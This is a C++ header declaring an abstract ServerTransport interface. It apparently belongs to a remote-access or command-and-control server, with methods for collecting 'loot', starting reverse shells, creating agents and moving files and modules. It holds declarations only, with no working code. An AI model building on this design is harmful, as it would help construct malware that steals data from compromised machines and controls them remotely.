#pragma once

#include "common.h"
#include "typedefs.h"

class ServerTransport
{
private:
    pClientNode node;
public:
    // generic protocol functions for use in the main handler
    virtual int send_ok() = 0;
    virtual int send_err() = 0;
    virtual int listen(int master_socket) = 0;
    virtual int read(char **buff, int length) = 0;
    virtual int write(char *buff, int length) = 0;

    virtual int download_file(char *ptr, int is_manager, char *extra) = 0;
    virtual int get_loot(char *loot) = 0;
    virtual int upload_file(char *ptr, int is_module) = 0;
    virtual int get_info(char *ptr) = 0;
    virtual int init_reverse_shell(char *id) = 0;
    virtual int determine_handler() = 0;
    //virtual int handle_auth() = 0;
    //virtual int handle(void *sess) = 0;

    virtual pClientDat get_data() = 0;
    virtual void make_agent(char *dat_ptr, char *d_ptr) = 0;
};

